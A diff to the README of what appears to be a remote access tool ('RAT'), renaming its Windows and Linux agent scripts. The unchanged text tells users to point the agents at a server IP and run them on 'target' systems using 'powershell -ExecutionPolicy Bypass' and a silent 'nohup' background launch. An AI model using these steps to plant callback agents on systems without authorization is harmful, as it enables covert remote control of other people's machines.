@@ -34,16 +34,16 @@ On first run it will generate:
 ```
 ============================================================
   PSK  →  a1b2c3d4e5f6...
-  Set $PSK = "a1b2c3d4e5f6..." in agent.ps1 or agent.py
+  Set $PSK = "a1b2c3d4e5f6..." in Agent_Windows.ps1 or Agent_Linux.py
 
   Cert fingerprint  →  ABC123DEF456...
-  Set $CertThumbprint = "ABC123DEF456..." in agent.ps1 or agent.py
+  Set $CertThumbprint = "ABC123DEF456..." in Agent_Windows.ps1 or Agent_Linux.py
 ============================================================
 ```
 
 ### 2. Deploy Windows Agents
 
-Edit the top of **agent.ps1**:
+Edit the top of **Agent_Windows.ps1**:
 
 ```powershell
 $ServerHost      = "192.168.1.50"    # Your server IP
@@ -55,12 +55,12 @@ $CertThumbprint  = "PASTE_FP_HERE"   # From rat_fingerprint.txt
 Run on target Windows systems:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File agent.ps1
+powershell -ExecutionPolicy Bypass -File Agent_Windows.ps1
 ```
 
 ### 3. Deploy Linux Agents
 
-Edit the top of **agent.py**:
+Edit the top of **Agent_Linux.py**:
 
 ```python
 SERVER_HOST      = "192.168.1.50"
@@ -72,9 +72,9 @@ CERT_FINGERPRINT = "PASTE_FP_HERE"
 Run on target Linux systems:
 
 ```bash
-python3 agent.py
+python3 Agent_Linux.py
 # Or run as background service
-nohup python3 agent.py > /dev/null 2>&1 &
+nohup python3 Agent_Linux.py > /dev/null 2>&1 &
 ```
 
 ---
